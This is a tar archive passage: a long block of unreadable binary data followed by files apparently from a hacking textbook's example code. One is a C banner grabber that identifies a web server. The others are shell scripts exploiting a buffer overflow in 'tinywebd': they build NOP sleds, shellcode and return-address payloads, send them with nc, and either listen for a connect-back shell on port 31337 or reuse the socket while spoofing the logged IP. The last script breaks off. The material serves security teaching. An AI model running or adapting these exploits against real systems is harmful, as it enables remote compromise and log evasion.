+�6�V�5Qg}t�S��|�VS�y��F��o���3��+;�\s��+�WY��� �>�Yi	�u��V֥���8LAV%��5qg��d3��*��E䐇����κQku����$R����|B���!�*�=cB���ʋi�5��3S1E�y�H�}s\bi�(��	� �ӆ]����w�ɧg��ְ'Y���>�c��:3b1gZ�Ļ��aH���$
�65j\C�aTW[1! S[i�RWD'fx[��zoRe�ֺ�ݻn�{���MH���h�Y��h �8�Jy��_�\Yr	װ_�'�s�s���֒�&� ���o� šH����32ٌ���$'ǒP؉
0���	��)嫳|O���[5�=x�¶���ܤ��|b�̬3� bg[3Kh�_�Z�Y���Ei��n��]4-~U�?�|����TP��DZUn�𨱿���u�Vǅ�e9C��� >w:{��_'�ǭT]Y۵��Ec8mV����e�+p��@������OQ��׳��%t�*�o7%�H.��bl��4�7�:���KM�O7��ǳ	v�)�c9,��/�e$8��+A�k�3k��������J����^���j;��tV��i6��/Mm���+�TK`~�*�����މ)�Q����8\TnX��B�Y(�|��w��ǅ�)�M���5���gj�� ��{gu�g���,� 6�b�&Pl�*��f��|A�U�ǚiՌ���efG��|w�}Ý����2ޡ�� Bٸ+�L��M
=�k�pnc��J�1��UV�iT��R�����j�Ĕj4�k�KD���踇�6���p�\��]D�c�X���U��I$Pt��v�E\�5>��_Ɣ~�Ú��칒T��G�����d��cGY��7��V55�~�l��[k���U��QU9���8�8�8�8�8�8�8�8�kݴ{%�W��q���xq��Y�}Y����9��%�Pe^��� ������%{a��q� �����[;��c[�m=��2��?EcG����d-�JCj{��6� !���@D�Ƈ�rQ�9;�V�y���&Ԓ�Z�yt�õ�?+���IM�3�̲�6ˬ����մ�[*)0�:��u����J)�Q�	�D�#Y� ��P�ww��صgf�>����^�Z���������My��k�k��`b�g�f��6wɩJ�_��}l��FA�N��>O
;�S�p����:J�|�ew���=�;�s���u�O��t���2��hYQ�R�\�-�)8�s'5�^�˓=���n�)��F�HVH�M���ٶ*�i�1��o�9�v�I4��%�mi�&O㻪���+��}&��e6>�c�gm2�S���7��D̓���P�K%Y|��a��d�����;�Ǣǯo����)9%��߁��|A��l޵B������9e��z�3��(re����d�w�n%Z�]� Kmֈ��DO�@�� ���9Y`�<��՜��Rލ�z�d$���A����� ��+��v���6����.a�l(,��WLY>
�&I�m�D3�g��p�Q�)l�)(�iY5��v��XT�	��^�s��z�A�8��(��}c�N���1����h�Y9�T�v<���^e��8��2ᛦ����8��x_�� �Eԏ̽|���6���� �vWf_�v��wD����u�uX����m�f]r5sR��.+j�6�
������� �IU�����#�ȸ;8X�;J�ӫ����q��M9�rbR��`cY[	�{�'�4ё )6���z���*���fc&�]�`�$�D���J ���/�8�t����{+�\�4ʯ��a�eb�al���ʠ ���&�}�C0��r�E�~���St��ӻ�<^8qX���_��c{5�H]#�7����<s�o��٨�֙#v9Ĩ�8I&=�����9
�?����� W�&̈Lg������P���v��.G��uvg�p\������m.��̒º8Ǉiep_�eٴ�"�])�K�y%��J)Z�7��r��Ag?/����ȇSŰE�y�A6#�����f=������Ie*7�%�~[r�Nv�.>�z�,�e��]�D���v�o!euu����\m���ꞣ�p�\&�ҖR��b�ͺ��8�}�W���FW����Bt�qgٺ{��4�Aa����kv*[���p�j�/����6�u��1���V\�f+h�8�Ͷӆ*�c3|���F����4vȎm��+|�Y�;��{�\���
�/ǚÑm�H߼���O��ⱕ�s�ׄ��U6uS��}0~nk�l+n��<����l9t�h�6qԘ��[�Nb�F���\�މ^z\���k�9�G6O�ʚ�ҷ5�\=y��T�ǖ�E��M��7.	�mO�b�\�EI�7t�[�
��UOv�mTID�|/좨�9�M]dV�N�ι3�wSFu�_�.�#�a�z��C��Ԧ�j|qlb�@���֬�Z�M���y��jB)��Y�Wދ�~���%����)k��EvW|������ko�*��]C"�3���V�X��E�Ք�n׫c��o�q���4��
�V8b�.�x;+>,�4�'jo���к��LpbZG��N}�6F�֙v�\�_��i��1�V��9�� y��?�i��D#"S=4����o�/"��VK2ev'�Qnl�7Ʋȳ^���#*�C_>'�h^���y�A����	����:-�$�':
N���՟��Ui[4hf���^����'���֒%�]��1s7Zn���~}�6����"���e���;���Y}��ׁ/���yk�-/�p=���e�^E��q{ d����ͅm�'C�q��Ri�LW�!RE� ��!4��Em4�ļ���=o�2��m��N�ɟ%,.4�AZ�c��-�� �����;%� �&W�	'���@Q��;��çׇ�d�.�����D��a�{��ö�KҎ�YzůĲ�Y�37�"(븵�FQ�#���!�ܤ�����
������ߚG%O��(�h 8�8�8�8�8�8�8�8�r��Q���-��\��xݤ�6�4�L�gv���Ze�r���#�,�bCR��Mv��w�f�B���2q�~}U�5P�����
��za�����������ݹ�s-��aQ��lY���&�E^\���ZM�q�T)u�s�"p����>���󺳻�<��%��͞V��o���{��
��\��;�ox��e��ݭ��Z�m_����:�x�'��~<��.�G�����E�qI�a�mv��9��an��I�/�v�L���]e��m�zϘ����1������*��~����r�����J��k�� �^q}��4�)T�>�7���v�߂��"��zܹ������w���,��֙Ȭ�f[M��<Ok`~;�,A%�!R���z�4h��"�" ��c��7��/ˇ罼
v��ֳ�^�7� p �ߔL�5���f�/�O��|�,���(�����-mq���������&'�#�Zj���Z��2Tҹ�^/�r�7�:?�{�Z�9�������*���pr��`�=��Ǌ|6�׶��ى�e�4nY����c�*�п[����.�X������=jֽί�+�a�?��U�\l�����;��es���6r��:��(�
�h$�4짿=�[�Xp�vZ���k���x�c��#��ˀ�V��T�;�SNcVu�oh��Aqoo2��(�u�gi9�eL�H">�^�" �"�S�����6�d}���am�;1�rܛ���mW��<vK,m~��|�����#��#)����!Hʌw��Y���%��x�GB�����x/�n�k�4���7�ܧ�B7	�����1��(� ;�CRu e�z	���p��^�n�%���yq֬M}����W��nR;�l�o���&��/sﮭ�nD�Q�9-�L�
$f"��l��-&�eq�wi�:/�>C�h�Ku��~<�G0e�-�n⽴g�1����[�'`D�)R��x6�g���T����-d�z|���q�������ũ��'�8�a4U������p�k+pmK,���vu��'�������2����O�W\��\{גH�Jy;k��ԸMC��`0*m��vn	��Ň�B��-Y�� ��L�H��	}��D�9�5���efl�X
C�[��S�vg:c�6/S�4K!��0BfgK�_q�c�p$*���r$u���ζ뭓Ϩ��x�RP���o�{���Ш�ٖ:�hL?�=�ػ_h��\U��|+)�f�J��]�ue^-��;��Q�&�!ǝ��f������v��f�ݾ���ϊ:�%�1�/�{:GA鞶�����ư�Sӎ\D�-���/���)�����ľ9�A,�[o3e]R�����ES[}�ό�)�f�/Ǜ�Pq�Z4Q6�ID��P�U</&p�K��n��۳��0��\��@�4Fq9�Z��0�HcT�/�~��9��y(��~�]),i��n���2��z��Z�g_�}�S�}� �67K;a1�����&V�I��nX3�x-��Ct�m}�C��k��^�՟��6��(��q"�D�|X�`��2�/:�W�!TUEE��9�������7�Y�S��2��/ZsW�P�uu�B����b��^�OѼ�jr꾿c�q�$/���ѳރ�N���rω|%�ְ3A�=�O�>��6�,�;�lC��_��|��<��o%HsA�_a��8}\��Q;
���Y�'����u�r&��њ{�:�%ӻ�Z��kX[��XR�A	1��A�BO-����T6�D���-�5%i+����ee��.�|}69/Z�염�Q�D�����蹆3 ��Yt�W�A�P��lS�) �h}�7'�����~v-ތ�l�k��-�_�����&A!gx]~����8���Ka����Oe1Iq��<����yT�|&�%�+�l�f�� p p p p p �ӳ�&��x�ˬ��U�w���dp��G��8Kz8:$�۬x$���$T!�m�n1���e(���������%ۻ3ow�Te����\˺���d8۵��ry�/d�4��aF�\��Cs�oGi�
��1S��ޜ��w�u�.Y�'V�����$�,?&��S��Q�����`��w�Ű�dֱO1r��z�d��"Z4@'�����I2�6ʰ�x�M7n
V��%���������A>E>N:�;��u�b���-����1��*p�;<:U�q#$��G]��-�1�u�qY��}��T�� k_++'���חӥ	5���7�ʗ{���h���ֻ�3���퍝Sb�)i.%;
��zL���7�!N�밣4.8��m�/�v͢�e�Oݰ�i������{�e�|�w=��mG{(6m�\+[Mĩ��59:����$�c�ch72�6Qc���ߎ�˿SiE�nVs\8�|����貥�}�~頻�?���� +{^|�����5��\�n���P���l�2�]��*]�
8�#]�Dv;m:l$'�W�@ۄ6�'g+��xe��K�w�I���.�烱��{���	���O�ݩϥa���=cqASkvU�n5���#�"K��dW���"��Q�i�Iml������^8���8o.� � oѢ��l`�-;����h�8��b��.5�����q*i߫[<��a�&L���q#��Dh?��T���j2��kpK���8�	F�mF�-Z�����>G��u�p���ef�]kB��ߩ�#�8-�5^��A�%dI?tGܱ���I0+(������m���l�J��7|�:*�����z�����`��i~6z���}����iK.탬���Ʌc*��Ud��/�� #��(�h��l�%*Q��2W�Sj9G-�#D��$X<�db�*��� T�E	�{'����梲������.�:�vZ�\u�w��i�.m�	��G�pja��Ew�BIc,���Q��*�x����mO�}�Ӽ�*�u�#�aq����r{�Wl"��2���[10�]!ۉ1ނsZ����5	NS��_25侤3�׿��;+�������-}�_���<��u���O�@9L��P1���cL��s��<����wfJ�K{BĔmŏ����A%Ӳ*�Z���ߵ�.�hpx�k^&��(�������C�n��Z�֊���9�N��R\J�&<wځY�i�7���/Ŝ�"�Jմ�-IF/����[����:tV�mu���r_t�������l�ǻ+�]����x�Õi'��4�S~#o:��JTO���ye3��`ˍ�vt� ���x5����]Y��d��e�{��Kۮ�?�k��S�<MRU�O_'�$�s`�S�la�ʊ댗��<MAP�xUDՌ��z��~
pY�D��G#�Q�>+w|�M��8�8&������T����}�}}��
���
��zR�m�� 8~�<�c�����I/�>I�,�dc}s�F��z=�G?��e0�~f�!�1x��-�(d���L�*
q���p���~�����BT� �b�'�B�çZ/K��m�,+�?}N��
^I"|x�v��b`�m��ف1��?��5a���o����R���v~�+O��!;�Z��Є��L;���]ڜ>o��I�Ybn+lZ]�L�Ju��C&h�j�t�	�.�/� �n}Bu��}�-�~���t��d�8�Wk�^�i����R��n���]T���Gk���\�,����J{�f����FPa	|���{���Ssll�g�7.	�������\�EXVԗ0��
��T_GYqIDI<�좊�x�Vy�wE]�Q{YхKώ��ˣ���}w����mTT�o��d�#d��$��@��d�g�s��xrg�ג�f��̱��&z���1���OL���g��$ۭW����#�	[)�5V���0I����+���t�FOw'ˎ��J�J�5�I��f��Z�Wi��˰�ٸs���	�2!Kh�D9"�$#�۠B�&*������M�tW�k������m�!��Ŀ����F�X�rT��!��Qna���c���P$�� tZp˴�q���ׁm�,�~���2�f�8�+Vx�K�3��2C��iJlFs�&-�i��|�p��14��L�b����.� ��/�.���%�^���o���N����^c�g�X����zM+�Ij��U�yR��ɯ	�D��N�}y�Cq��$�D�\�I��6���OŖВ�҆.�סy]A�6ө}]���*��F��ߑ!�	�p�#��*����������2�'n���� /X� �9� �Ǧ���w����L�b��Z3~�kn�}CŎ�z�H$D{�T~�Lªy�˰�w/b���K��^k;�OėaW.Gb�8͛�]-���lP�B,��b_�6�1���G%�_����`��dp�����ϱ�t�x�{��7�}$FxA�	}T�R"BJ�� � � � ���&�������;����>��7ގ�y��*,�$0`�/4�8.6bH��|*���<Φ�F��� � �ܜ?���f�qlvVg
3��[���;���MHQ��Q!ED_	�8I�η��{UgGj��U̎�I-{�����
���UO(��� � ŵ���4ּ�u>��+0�s�UƦ���*���a�m��ʪ� �'�UU������B	+,��ۻ3�L��籽V�� m��Xa5�n��bJ)��ȅ2�I2l�ЧEq�1]V�u�6\Q2O>�N	�1Y�	��C㷬ѱ|B��/X0z�x�Tԍ��?&��rM�\3�O:f��DE���8Y`�)JS��-���-��:��;��žq#�2�'B�X���9;�N�6�'n#�_��2����w�e#�(��'Ӓ�Ӌ��d��T\��|�F���a� _%��7��7`�׍a���ɠ�
K�*.n�D�y%�0�vj��3�F���J�����8�������/���=�^ZH�� fl�Mk��lm��
�8�\���i���|&Wt�"����DU_航����4��F4�vDe�O�_O��
\���:�����f�L�2��R��&��J���%a�A���	S�����j�%:r��=���vݚO6������]�d2�F�M���Lq�Q�!uHIQQy)SRV��!����0lǾZN�G� (ۇ����̹���װܟA=� �t����I�(�J��6�em�A�OI�y���B������45�xKZ���캝����l<�������ɶ-��G��u3ӛk�H�묶�3m�FɡTxU����Mym7	��Z皿�����E[�-�3°ݑ�d8�������Zk�M�g���"3�M��"�P4TT����՞Di�i+�]����y�^Ԣ�����_6T�a�����������ϱ��z��#�������߃��on�K>"����ߝy���'cLl�)�lG�������m@\r�[fq.a��
�:萘)d���
����Je�=�q.�g��s��?WM����u���L��l���r@���]oƥ�?�$Ti�!41"��%%fvqwD�w��&
�.��~N����{�volb����;8^���Q�X�0��;��Uy�>����+�e�����kX�~���x:�^���Ckbͺ�gs꒩�z	�Kn ȃ,D�J4��x<� 0'����J�d%��i k���~Q{j�e{V��u/��dQ���τ���+�a� 4i�� 򧌰���^�.��]��f_#N��Ƿ|�"\Y�sSc�7Z�D���&8��?�<h���%����~���O^�i|��ze���Q� -q����
ͥ�?�N�� ����S���?�N� ��s.��!ܽ����.�I����ƙ�ڷΦ�������Ŋ�dQ���a� By�qL=��EU	Eo�*�*E;�2�}��C�Z����[�r\:��Z�
,�_��c��Im�D���A�$�e��J/YZ����r���R֫8Ϋ�%[W�VGX��<83��Hι����*���'���*6? p p p p p p p p p p p ��^5V��i�-����b���_��*XQA�W�Ǵf��&�h� `�"� � (�' ��&�7�����"x�B��LKmR�8��mHU�`+���=�Q$�W[mϨ�M�O�;��@|*�B3����i�Q�"�:-�'�5n� G�I����G�YG�v��z^K�܎h�(W?��lƬe�!Ou�2�L��?6g����}��W�V�}�����{��kˡ>>w�b��[XS�I�F�����ĆԱʲ�흶/lg�t����^"�Jyb��8v�}Ǻ��>X�^^�+���:�9W�΀�����k�]���;_+\�h�U���=�o�y��-d&c�!���lOd^�C�"I�_>�)�)�=�۶Xg�t�f�SF��98�w�,Z:����ϼZ2'a�y����dƏ`w8VC[
e=��Z7����1�pmە4^q����PDm=
P�3m��8ۭ����XEX��"�čX�ز�,� 4�S�DDDD��9�����_;k7���+�7wc�8~��f�N]�y_z� $&~Xt]�hf.4bf+MJ1�/5�������57y�KK������Q	B&��t��kM�>���8�_���1rαQD8M��cV���⹬����ś��˃�w�G����쎵Ʒ��Xv���+��Ts�Lg�/�l�W�n�yh��!TK�QI^.�Qqvh�{'�N���^��=�����=����G͠�����h�t��^�X pb�*R�����n.��E����-.�M:� ���$gncp}�bN2Hy9����)A�vC�F���K��?OYؖx?Oֲ'_Y;��^���9W_�UVj�2ҷ!�6��o�OO>Э+��
H�8*��+����ym:���Y\��$�-8W�d�:�f��C{�\�-�_o�v���#�u�qY��/�7q����=��E�=�5U�t�ӳ�?�­��F���=�����7�W�X~�{���]�6���8 �w������bJ��� 	b����/���s$�)|��Y��7���q���g��>#K�cSt&�~�l��ck�l/�ͪ��������>���������3ϑ���۾G�.T��9�Q�[�u�ZIh��T	$��5Aq|
���m?N]ϯ��4�dg=2� s�� ���� k��f�۟�g��?��p��m� ����'� ��a��^��Gԗ{'o5����ƺ�� +G� � ���������������1|�!���nW]�d�����VQҋar�M�"Hu�U�TQ�G]l=�}��$%�����w�];���s��S\�j�d��+WW�y �RY�}wJ8B���N5z�/4O{�����&��Z�!���3�{��M=��+�7�i~�Wg4�kX��ۻ��İ6b~����nc0�+m�o�k^㔧&16S���|Y�.��]�ۅ��[��8ɩG_������-a�`=M�z�2t��8�`貉�,ک�*��wM"��x6OQ��ѽ�����P)
�;v:{�J�_��s3�ޕ��ͅ�8h���B�$�ݝ=�yGG{8�91��-�F�,�����IB�K&�g���x I<�_�=g��D�R��ax�Ȟg�{��i򋬨��`���W�*�,�]��A��N9����(E�V���A��z�ѻ�\:��x�+��[��}w�\[����l��y�C@�Ș�~�*������5���}���iw;<�@�~�"¥ښ��i�8ѐ���-�Enʽ 5�4�J����^sԣ=�>:��,�F��kX�;u�Ό*������]��F��6�j�����n6�;&�$O2���&�� 9�p��k�z�v;���yk�Z&�ٚ�r�������/����T�SwM5�p�UT�i��D�HW���*��QS�!4��Em4���\H�$��<�/�L�����'���UQQeNL�Q7szٰ����Xex/S��Xl�� �y�D);�Z�G�S��=V����8q�Rt\��:�ޥ�N�8���]�'���{m�?�\t���h�
�L{[7Og��q��S�c���+����p�=UYfx}�+T�#�j�Ӕ&����LׯDN�.ҔqWֲ-˦_�}���� �q���m-���vw��c� L� �������� "p�?�v���]�}Iw�v�QI:s���5�-��a�4��Nm�����"����!T𨿲�T�S�I~ � � � � � � � � � � � � � �Sxu������1N���O�q����A�˱����(�4܀4�RT��@^D�V���5i��Q���Y�bD�_4c�b�,� �
xO�E�D�O��8�8���X�cGg�e��V55�bmu�P�[k�A�\E��8S��v���Y��ɣ�p�\)�'b˙c�X�����#��I$ShA�v�E[�	>����?M�����\�]U/�x�?~������ڻ:��q���=�lŲ�����˷��ڎ�ذg
�؉a:�z���_��Ƽ[�x>OV~eI�V(�^j UV��ݴ���y|s�{���rn���������9�%�[���:��Ot3IX7̲�gzn������r�S��H�u�����-������I��&m�����iG���M�}L�)���t�bRz�:��;E��L���f+��Z'5��vh�=�k�����p���-�F�)o ���x_ �'���`�*f"`BB��ʚ���Ќ�]�3�k�ñ�G��I�UBb����8��6�@����������S�����g8c=g�{ϡ?ñ�uͮמ޾M?y�S���M>�i��+P��c��ؘ�_��8$.�7��Ԝ�Sw�.�5�����9���W�g@�7�{C��^��ݺ���܇�\fu���X���ȝ,ၑ/��5.�L9$2��22���e�H�[�ۮ9���W�\U��� �;c���3��S�c_v#lVa[j;����Y�$e����llYM�z��l�y]e��@}�3΍n�����\��N�Ԇ7�ol}K#�:����}웴s��n��v�� ǵ+����͵�2��E:t���t��l@5����*E��q'.�v}���7�mg|�p�]�WF��l����Rf��ˏ�Ne���O��]�N�Ψ�H�k�#2����tҞ MlšU��yT��o�� 㽽���CS�i�u��?8�kl�f��q|��͵���Q��?�2�Vt�/�&%w^g�EEV�p����*���^ǚќrg p p p p p p p p p p p p p p p p��]Խ��2��Ҫ�G���V�m�uq���mZ��s�_���i�?U�ʪE8�<��M<3*����f%�e��2>cz1��.-o��&Q�GuaQ�<�j���%���y�D��2d���g����������e�� u���[�Y���>�c��:3b1gZ�Ļ��aH���$
�65j\C�aTW[1! S]t�+����ٛ�e�=y�pL�W�'����*¶���ܸV���:ˈ�H�"I�?eT��N	�<�m;���u������ aH�={e�f__v=�*X��ò~���J0f�TSV��6�DiJ/��<�|��7ԗk=g�2F����c�9m֞�Y�����I�Z�aW->G2�S"2j��W��`����PW�=�̩֌��O�uX�6��kX���
�{�?�N�� ����S���?�N� ��s.��!ܽ����.�N�j)"B2\�0�]���*�gcl?6��S�eKqT�����fK� ��� ��������������������.-|I3�ʏ
��<�@)䌉aDUU_��U�Amq����o��>��K����Xn����*?tuȴ6���d?(	A���ڬ��W�K�'�$�\���;�V�Au�o�Q-,���@W\�6c�\WttYo�A�Yoʣi�ҥ-ث"3���5�f���'��mUb�J����on`��VWJ�����T�~����\	�*���F2{�>|u��J5V�`F(]��'Hnj�>�a�؎��з޸�x�ՠ� ��cl7����+~����mETn1���%u���"N1x�-k���]�5���(�V������L��.h�Z�P�'�����Sϔ���r�I5u�[M;3O�g��s��?WM����u���L��l���r@���]oƥ�?�$Ti�!41"�JJJ�Bn.背[|�|�6&GW��O:�˂q� �O����Н)� c��E�Hm�;��R}����}����W�ɽ�e��ְ&&%�^�vϮ;?b��m�[n��,�}RU4��#X�0�A�X���i-��y�`N[N�d�FPq���ŷ�2~:?Ȝ� O��[Їr�,�>���;y���?��5�?�Z?� ȸ�� � � � � � � � � � � � � � � � ��콙�4�	����b��\��Y��w3[�
��TOw^qPEHE<��UQ9	�%w�ԛvD��f_"P�^�lZ�\�CM̢��:��e�B	9\�;��UPhȜI^�G�"B�k���_c��wOʢD�_4c�b�,� �
xO�E�D��O��8�U���ދ�l\����C���Z�;����Nz�����4�O�5u�L�2�Kʸ��4y^Γާ���_|�^��!�l::ַU���U="�nH8P3���c�<�j?�d.��w�J-�q]S��Q�!��6���<� 6�w������r�Tzˑ˓Y�M�ݛ 3�4�;!�rB*�2�'�T������8}؇��Im.7嗞^�~Y�Y���~���9�nW֝a��?⻳�e���3����SGr�ф40��'ͳ���O!R���˶||VOϻ�dj$��W�9�۵F7iӎ�u�F��d[3��Z\>]�3 �z?��Z��?G'^�L��-�rd�RAQ4Ew�ҧ�E3��l��]���2�s����2���"���#�9E q�`@��QBk���}Wħ$��A+�"|<v;Jv7�:nn�� g��1�Ǣ�}��ѐ�Q�ExZ��ʂ:>�|r�¢ރ�;:n.�̴n\Dp p p p p p p p p p p p p p p p �{�ykN�k�m���֖�:q�b;��[����|6���1�l��쉸j+�+�y	�+�J��O�Oh�+*���Ʈ���[`rL6N>�!�W��3ir(�z�����-#��#���l��� � � �u�EM��++�*���ƖȼӾ		=��Q|*"������ � ��D�_4c�b�,� �
xO�E�D�W p�4&���� E�3;KYem����Q!Z�6$��sa�
��y3�͢/~:a�h~1���V��Kc�NreD.��*c��v�	L���R[2Ы�[A��hэ8�C"u*9��fX�9�㙍fO���eX�֑�V5��LYm��6�mTW��ET��s�8�8�8�8�8�8�8�8<?/�4Y� Ɔ��u��o�	:��?��Y*���Y��#��v��bC�~����� #�R/?n�~���ۣ�i���ĎL���N�7������Z`z��!���3��9:�Y��ð����pf{~K%�B1�����E�۬�q}����ާV͂�?ͻ���~L�V�]w&��@��Ʊ�k>�_G��]=m��+�� ��a/�6]*� �I��$d����ϩ�u�E7��럦eq�ҿ����uvN��O�}箴	�ZOsqqe�_L���9�~��O%y��@�:Ț�W%l�"�����yyq$�w������D��jeYlm��s���U���p�:,��`Iu��"I}؂l��Yu��� ,�ClJ��)�<=]����Rʛ&����YoN>R3.���x���[aU���lG�dUs���8�W��]��i��?���GX/Op1$��9(��;J��~�R��7�"�Ƕ�����]i+IW�w[˃3yu�c@�nSb~� ��y�e�a��ѧ3�Q�D��g���[��_����o��߹:�=ډڇM�Y�$7S�cRn�ά���`7
�,h�CGc2� ��!�M)�/%Onr��o�캤�Of���G]���ڮ��g����p�Z�FA�����cvcc3~mb4�K
	�f�q�$E	Bq��� �+� !���I/��q�ǡ*{.����;V|�w�3��1K���14.	�a��k߳�?z^�TF�*u�P��l#���4n��m���~��1�i�5��vϢ|��J�To|����bh2ɶ:O�v.U��VS���&�Ťd9�z�8�P�#��%���߆��Ƒ[D5EU\��s� ^\_��]�U�x���2��� e:��Z��z�1Ű-��▖��ܼ	QE_E �!aʘ��7*B7U�/�p�ͣo��n�$�'�Ѝ-�I&���k��q;[�}ݲz��]�l�?�2�\��������}?�&3O����4�n}a������-�R��#���$��{2�T��9��iC����Σ��:�W�=�9��l.%J~�\+7��o�|�\I&�hQ���j`�z���1Q�m{[��+� E�ذ�y^��y��1�ϱݑ���Ծx�a��}ۮ��pL]����e����q[t�lh?�zK����J��c����o�	�e�q�E��#-�֪��n5��H+h��I�i�N��$���˟�1��n��Xk�vMp'O-"8�8�8�8�8�8�at�Ų�&�)����J͵�g�'�V�md9�W�#�
ﯺ�")x�� p p p p p p p p���W�����[sj���`u}��Ȓ�yX̩��zD��+&$g�B>�6*)�(�v�y���ɑW�X��י5�U���c�6U��ٱo�dV�m#9!:��͞�g��͋&㍑���%�/0��~�Y�VV]�^|E�tj�_�4��Z�^le�9�7ml�;v�RmcD)O�7چ���6��m�Oe����\�d%ZR�o#�̾)><�*e�g=]�2�{��V˳��"c��27��奂��-�!�`pXi�� '�!ˍ�N|Is5.!�m�i��y�Eզ^���[Y1l�,��T(�'�t�SݑZL�DBp�d�Ϗ>?nU��V�^��]�'-�o~���/�����h�\t���_��d��3O�Rf����xqd>N:� hh@*�{<0��|s�<H�Y6c���a�����\�KT��0ߋ&t;2"����|%�N���8��
�*�;=�Vk��~b5d�Lޗ� �.J�j�OD�vׅnы��\��h��\��i�D�'-�m�<����������3���]��!�c׌5�7}[����x��Ԩ9Yy��J���!����:Q���SD���	�p�c�42Ͻ������(�]�/��2�1�1�N���O����C&]c��jH,
	��K����G�\������M���S��������j������ ���ٛ����}O�{l�'sc��)7���$��������5��$1p�;���FZI�,T�V��]@U�N.q��{��fr
��Px�3c�Y�X�{������9�s��)�g�?���dT���+K��b�w�z��E�m��Et��.�4��J.�_z�����Ȇ��v�Ӂ��e��p� �$�ﭝ�c\R�����h�P�Elf�zw�}e&�ؠ��E�.8$ ����B�w�n���<-{���Y
U �o��X�`|N�ƺ���N���n�'�z��b+���	1Zz�ʏ+��|/!�7<(� Jo�79Ӛ�P�O[5��%Æ%4���w�����@�c_����\�<G�7��]�^͹�{���w�?WKˁ�R��]�Ǜ��?�}<���C�Z+��6Q�k�|��<���+�1�or�c�
�1��w2\�c�%e�Ȁ	ETER�t�U��~�%&�$�-"8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�`�7����`���M�:��}����`�p�#q�QRD_QS��7�'@p����)�y�eX�/Ь`bP������X��]G�b|��.j=-�L���e^yt�������pw収&��x����/���*�O/ʻO��u>IO��V9�Q+����%?^�|X�u�i?>D�6�A�y=z�������\��X���������!���q�{�������~I�WfUu��>B�0�J��rc2�9(�$F'� ����d���liJ�O;�������ڵ����C��OYm��4S�>��u����A9�2c�b�#�(P,���r:�yHC��F;�m,<���ge�I��_?^�a]�X�� R2��a���j�&���O�V30�b=HJ�US3b!�l�5�%_��CpOTi��n�ǵ�w�̞<��� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � ���                                                                                                                                                                                                                                                                                                                      webserver_id.c                                                                                      0000644 0001747 0001747 00000002232 12564742435 013217  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "hacking.h"
#include "hacking-network.h"

int main(int argc, char *argv[]) {
	int sockfd;
	struct hostent *host_info;
	struct sockaddr_in target_addr;
	unsigned char buffer[4096];
	
	if(argc < 2) {
		printf("Usage: %s <hostname>\n", argv[0]);
		exit(1);
	}

	if((host_info = gethostbyname(argv[1])) == NULL)
		fatal("looking up hostname");

	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		fatal("in socket");

	target_addr.sin_family = AF_INET;
	target_addr.sin_port = htons(80);	
	target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
	memset(&(target_addr.sin_zero), '\0', 8); // zero the rest of the struct

	if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
		fatal("connecting to target server");

	send_string(sockfd, "HEAD / HTTP/1.0\r\n\r\n");

	while(recv_line(sockfd, buffer)) {
		if(strncasecmp(buffer, "Server:", 7) == 0) {
			printf("The web server for %s is %s\n", argv[1], buffer+8);
			exit(0);
		}
	}
	printf("Server line not found\n");
	exit(1);
}
                                                                                                                                                                                                                                                                                                                                                                      xtool_tinywebd_cback.sh                                                                             0000755 0001747 0001747 00000001403 12564742435 015126  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #!/bin/bash
# a tool for exploiting tinywebd with connectback shellcode

if [ -z "$2" ]; then  # if argument 2 is blank
   echo "Usage: $0 <shellcode file> <target IP> [connectback?]"
   exit
fi
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff7dc
echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))
echo "aligned sled size: $ALIGNED_SLED_SIZE"

perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE" > ./.xploit_buffer
cat $1 >> ./.xploit_buffer
perl -e "print \"$RETADDR\"x32 . \"\r\n\"" >> ./.xploit_buffer

bash -c "sleep 1; cat ./.xploit_buffer | nc -w 1 -v $2 80" & # send the exploit in 1 second
nc -vv -l -p 31337 # listen for connect back 
rm ./.xploit_buffer
                                                                                                                                                                                                                                                             xtool_tinywebd_reuse.sh                                                                             0000755 0001747 0001747 00000002133 12564742435 015207  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #!/bin/sh
# silent stealth exploitation tool for tinywebd
#    also spoofs IP address stored in memory
#    reuses existing socket -- use socket_reuse shellcode

SPOOFIP="12.34.56.78"
SPOOFPORT="9090"

if [ -z "$2" ]; then  # if argument 2 is blank
   echo "Usage: $0 <shellcode file> <target IP>"
   exit
fi
FAKEREQUEST="GET / HTTP/1.1\x00"
FR_SIZE=$(perl -e "print \"$FAKEREQUEST\"" | wc -c | cut -f1 -d ' ')
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff5c0
FAKEADDR="\xcf\xf5\xff\xbf" # +15 bytes from buffer @ 0xbffff5c0
echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
echo "fake request: \"$FAKEREQUEST\" ($FR_SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))

echo "[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret addr 128] [*fake_addr 8]"
(perl -e "print \"$FAKEREQUEST\"";
 ./addr_struct "$SPOOFIP" "$SPOOFPORT";
 perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
perl -e "print \"$RETADDR\"x32 . \"$FAKEADDR\"x2 . \"\x01\x00\x00\x00\r\n\"";
cat -;) | nc -v $2 80

                                                                                                                                                                                                                                                                                                                                                                                                                                     xtool_tinywebd.sh                                                                                   0000755 0001747 0001747 00000001112 12564742435 014000  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #!/bin/sh
# a tool for exploiting tinywebd

if [ -z "$2" ]; then  # if argument 2 is blank
